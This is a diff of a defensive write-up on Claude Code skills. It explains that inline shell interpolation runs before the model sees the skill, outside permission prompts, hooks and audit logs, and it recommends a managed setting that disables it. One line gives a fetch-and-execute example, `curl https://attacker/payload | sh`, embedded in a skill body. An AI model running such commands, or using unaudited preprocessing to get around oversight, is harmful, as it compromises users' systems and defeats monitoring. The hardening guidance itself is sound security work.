@@ -18,15 +18,15 @@ maturity: adopted
 
 > Inline shell interpolation in skills runs as preprocessing, outside the tool permission model. A managed-settings gate routes shell side-effects through the audited Bash tool path.
 
-## The Side-Channel Execution Path
+## The side-channel execution path
 
-Claude Code skills can embed `` !`<command>` `` and ` ```! ` blocks that the runtime executes before the rendered skill body reaches the model. The Skills documentation is explicit about the timing: each command "executes immediately (before Claude sees anything)" and "the output replaces the placeholder in the skill content … This is preprocessing, not something Claude executes" ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)).
+Claude Code skills can embed `` !`<command>` `` and ` ```! ` blocks that the runtime runs before the rendered skill body reaches the model. The Skills documentation is clear about the timing. Each command "executes immediately (before Claude sees anything)" and "the output replaces the placeholder in the skill content … This is preprocessing, not something Claude executes" ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)).
 
-Tool permissions, PreToolUse hooks, and the Bash allow/deny list all gate model-emitted tool calls. They do not see preprocessing. A skill body containing `` !`curl https://attacker/payload | sh` `` runs at invocation time with no permission prompt, no hook fires, and no audit entry beyond the substituted output that lands in context.
+Tool permissions, PreToolUse hooks, and the Bash allow and deny list all gate model-emitted tool calls. None of them see preprocessing. A skill body containing `` !`curl https://attacker/payload | sh` `` runs at invocation time. No permission prompt appears, no hook fires, and the only audit trace is the substituted output that lands in context.
 
-[Skill content lifecycle](https://code.claude.com/docs/en/skills) compounds the persistence: the rendered SKILL.md "enters the conversation as a single message and stays there for the rest of the session." The interpolation runs once; its substituted output becomes durable context for every subsequent turn.
+The [skill content lifecycle](https://code.claude.com/docs/en/skills) makes this persist. The rendered SKILL.md "enters the conversation as a single message and stays there for the rest of the session." The interpolation runs once, and its substituted output becomes durable context for every later turn.
 
-## The Gate
+## The gate
 
 Claude Code's `disableSkillShellExecution` setting closes that surface ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)):
 
@@ -38,11 +38,11 @@ Claude Code's `disableSkillShellExecution` setting closes that surface ([Claude 
 
 When enabled, "each command is replaced with `[shell command execution disabled by policy]` instead of being run" ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)). The replacement string is what the model sees in place of the substituted output.
 
-Scope is the set of sources users author or distribute: skills and custom commands from user, project, plugin, and additional-directory sources. Bundled skills and managed-settings-deployed skills retain interpolation ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)).
+The scope is the set of sources users author or distribute: skills and custom commands from user, project, plugin, and additional-directory sources. Bundled skills and managed-settings-deployed skills keep their interpolation ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)).
 
-The setting is "most useful in [managed settings](https://code.claude.com/docs/en/permissions#managed-settings), where users cannot override it" ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)). Settings precedence places managed first: managed settings "cannot be overridden by any other level, including command line arguments" ([Claude Code permissions docs](https://code.claude.com/docs/en/permissions)).
+The setting is "most useful in [managed settings](https://code.claude.com/docs/en/permissions#managed-settings), where users cannot override it" ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)). Settings precedence places managed first. Managed settings "cannot be overridden by any other level, including command line arguments" ([Claude Code permissions docs](https://code.claude.com/docs/en/permissions)).
 
-## Where the Gate Fits
+## Where the gate fits
 
 ```mermaid
 graph TD
@@ -57,25 +57,25 @@ graph TD
     H --> I[Audited execution]
 ```
 
-With the gate on, the only path to shell side-effects is the model emitting a Bash tool call. That path is observable: deny rules apply, PreToolUse hooks intercept, and the transcript records the invocation. With the gate off, two paths exist — only one is enforced.
+With the gate on, the only path to shell side-effects is the model emitting a Bash tool call. That path is observable. Deny rules apply, PreToolUse hooks intercept, and the transcript records the invocation. With the gate off, two paths exist and only one is enforced.
 
-## The Generalisable Pattern
+## The generalizable pattern
 
-The pattern is a *uniform-execution-path* control: any agent runtime that exposes non-tool primitives capable of side effects (skills, snippets, custom commands, plugins, prompt templates) needs a kill switch that funnels execution back through the audited tool layer. Inline interpolation is the most direct example, but the same logic applies to any pre-render hook, template macro, or expansion that runs outside tool dispatch.
+The pattern is a uniform-execution-path control. Any agent runtime that exposes non-tool primitives capable of side effects (skills, snippets, custom commands, plugins, prompt templates) needs a kill switch that routes execution back through the audited tool layer. Inline interpolation is the most direct example, but the same logic applies to any pre-render hook, template macro, or expansion that runs outside tool dispatch.
 
-The mechanism mirrors the [hooks-vs-prompts](../instructions/hooks-vs-prompts.md) distinction at a different layer: prompts are guidance the model can ignore; hooks fire deterministically. Inline shell from a skill is *deterministic execution outside the audit boundary* — the worst combination, because uniform policy enforcement assumes a single execution path.
+The mechanism mirrors the [hooks versus prompts](../instructions/hooks-vs-prompts.md) distinction at a different layer. Prompts are guidance the model can ignore; hooks fire deterministically. Inline shell from a skill is deterministic execution outside the audit boundary. That is the worst combination, because uniform policy enforcement assumes a single execution path.
 
 ## Trade-offs
 
-The gate sacrifices the ergonomic value of live-context skills. Patterns like `` !`git diff HEAD` ``, `` !`gh pr diff` ``, or `` !`kubectl get deployments` `` ground skill instructions in current state without an extra round-trip ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)). Disabling them forces every skill to either degrade or rely on the model emitting explicit Bash calls — which adds tokens, latency, and a permission prompt path unless `allowed-tools` is configured.
+The gate gives up the convenience of live-context skills. Patterns like `` !`git diff HEAD` ``, `` !`gh pr diff` ``, or `` !`kubectl get deployments` `` ground skill instructions in current state without an extra round-trip ([Claude Code Skills docs](https://code.claude.com/docs/en/skills)). Disabling them forces every skill to either degrade or rely on the model emitting explicit Bash calls. That adds tokens, latency, and a permission prompt unless you configure `allowed-tools`.
 
-Bundled and managed skills retain the interpolation, which preserves Anthropic's first-party patterns and lets administrators ship trusted skills that need live state. The asymmetry is the design: the gate hardens the untrusted surface (user, project, plugin, add-dir) while keeping the controlled surface ergonomic.
+Bundled and managed skills keep their interpolation, which preserves Anthropic's first-party patterns and lets administrators ship trusted skills that need live state. The asymmetry is the design. The gate hardens the untrusted surface (user, project, plugin, add-dir) while keeping the controlled surface convenient.
 
-The gate is most justified where untrusted skill sources can plausibly reach the agent — plugin marketplaces, shared developer tooling, third-party skill registries — and where [skill supply-chain poisoning](skill-supply-chain-poisoning.md) is a credible threat. For solo-developer or fully-internal-skill contexts with no plugin surface, the gate adds friction without proportionate threat reduction.
+The gate is most justified where untrusted skill sources can plausibly reach the agent — plugin marketplaces, shared developer tooling, third-party skill registries — and where [skill supply-chain poisoning](skill-supply-chain-poisoning.md) is a credible threat. For solo-developer or fully-internal-skill contexts with no plugin surface, the gate adds friction without matching threat reduction.
 
 ## Example
 
-Managed settings configuration deployed via MDM or `/etc/claude-code/managed-settings.json` to enforce the gate organization-wide:
+This managed settings configuration enforces the gate organization-wide. Deploy it via MDM or `/etc/claude-code/managed-settings.json`:
 
 ```json
 {
@@ -84,9 +84,9 @@ Managed settings configuration deployed via MDM or `/etc/claude-code/managed-set
 }
 ```
 
-Pairing with `allowManagedHooksOnly` closes the adjacent path: it ensures only hooks from managed settings, the SDK, or force-enabled managed plugins load — user, project, and other plugin hooks are blocked ([Claude Code permissions docs](https://code.claude.com/docs/en/permissions)). Together they restrict both the inline-shell and hook surfaces to administrator-controlled sources.
+Pairing with `allowManagedHooksOnly` closes the adjacent path. It loads only hooks from managed settings, the SDK, or force-enabled managed plugins, and blocks user, project, and other plugin hooks ([Claude Code permissions docs](https://code.claude.com/docs/en/permissions)). Together they restrict both the inline-shell and hook surfaces to administrator-controlled sources.
 
-A skill that previously relied on interpolation is rewritten to emit a Bash tool call the model dispatches. The agent's `allowed-tools` field can pre-approve the specific command pattern so the gate does not introduce a permission prompt:
+Rewrite a skill that relied on interpolation so it emits a Bash tool call the model dispatches. The agent's `allowed-tools` field can pre-approve the specific command pattern, so the gate does not introduce a permission prompt:
 
 ```yaml
 ---
